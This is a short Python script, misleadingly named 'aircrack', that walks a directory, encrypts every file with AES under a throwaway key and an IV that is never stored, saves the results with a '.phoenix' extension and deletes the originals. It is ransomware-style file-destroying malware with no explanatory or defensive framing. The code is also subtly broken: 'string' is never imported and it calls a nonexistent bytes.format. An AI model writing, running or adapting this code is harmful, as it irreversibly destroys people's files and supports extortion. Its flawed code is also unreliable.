import os, random
import hashlib
from Crypto.Cipher import AES


abt = string.ascii_lowercase
x = ''.join(random.choice(abt) for i in range(20))

def aircrack(directory):
    secret_key = hashlib.sha256(b"{}".format(x)).digest()

    for root, dirs, files in os.walk(directory):
        for file in files:
            with open(os.path.join(root, file), 'rb') as f:
                data = f.read()

            pad_length = 16 - (len(data) % 16)
            data = data + pad_length * chr(pad_length).encode()

            cipher = AES.new(secret_key, AES.MODE_CBC, os.urandom(16))

            encrypted_data = cipher.encrypt(data)

            with open(os.path.join(root, file) + '.phoenix', 'wb') as f:
                f.write(encrypted_data)

            os.remove(os.path.join(root, file))

                


